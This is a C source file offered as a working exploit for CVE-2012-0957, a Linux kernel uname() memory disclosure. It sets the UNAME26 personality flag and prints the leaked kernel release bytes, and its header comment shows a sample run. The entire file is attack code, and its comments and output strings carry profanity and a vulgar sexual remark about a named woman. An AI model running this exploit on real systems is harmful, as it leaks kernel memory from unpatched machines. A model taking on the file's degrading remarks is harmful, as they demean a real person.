/* 
 * cve-2012-0957.c
 *
 * Linux Kernel uname() Kernel Memory Disclosure Exploit
 * by: _77 (aka X-h4ck) <mem001@live.com>,pirate.al,www.flashcrew.in
 * special thanks to Lisa Ann for givin me a blowjob today
 * greetings:devilzc0de.org,bukibv.blogspot.com,jasaplus.com,hf.al
 * And yea im very very proud to be albanian. 
 * tested on ubuntu 12.10
 * FOLLOW ME : http://twitter.com/77_pal
 * p77@ubuntu:~/Desktop$ uname -r
 * 3.5.0-17-generic 
 * p77@ubuntu:~/Desktop$ gcc cve-2012-0957.c -o cve-2012-0957
 * p77@ubuntu:~/Desktop$ ./cve-2012-0957
 * 2.6.45-17-generic ,Fucked 17 bytes!
 * CVE-2012-0957 PWNAGE! by :_77,mem001@live.com
 * (aka X-h4ck)pirate.al,www.flashcrew.in
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/personality.h>
#include <sys/utsname.h>

#define UNAME26 0x0020000

int exploit()
{
        int fuck;
	struct utsname uts;

        if (uname(&uts) < 0) {
            perror("uname() error");
          }
        printf("%s", uts.release);
        fuck = (strlen(uts.release));
        return fuck;
}

int main()
{
	if (personality(PER_LINUX | UNAME26) < 0) {
		perror("personality");
		exit(1);
	}
	printf(" ,Fucked %d bytes!\nCVE-2012-0957 PWNAGE! by :_77,mem001@live.com\n(aka X-h4ck)pirate.al,www.flashcrew.in\n", exploit());
}
